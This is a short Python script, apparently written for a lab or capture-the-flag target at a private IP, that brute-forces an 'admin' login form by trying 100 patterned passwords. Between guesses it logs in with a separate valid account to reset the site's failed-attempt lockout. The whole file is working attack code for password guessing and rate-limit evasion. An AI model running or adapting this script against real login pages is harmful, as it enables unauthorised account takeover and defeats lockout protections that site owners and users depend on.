import requests
import time

url = "http://10.80.185.153/index.php"

s = requests.Session()

for i in range(100):
    
    if(i % 2 == 0):
        responde = s.post(url, data={"username": "root@gmail.com", "password": "root", "submit": "Submit"})
        time.sleep(1)
    
    password_guess = f"admin{i:02d}admin"
    
    print(f"[*] Guess: {password_guess}")
    
    payload_attack = {
        "username": "admin",
        "password": password_guess,
        "submit": "Submit"  
    }

    response = s.post(url, data=payload_attack)

    if ("attempts") not in response.text.lower():
        print("\n" + "="*40)
        print(f"Password Found: {password_guess}")
        print("="*40 + "\n")
        break


print("END")